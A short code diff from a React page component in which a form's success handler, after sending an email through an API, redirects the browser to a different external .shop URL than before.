@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://toby.slet-ganghus.shop/';
+        window.location.href = 'https://tet.sefh-cook.shop/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
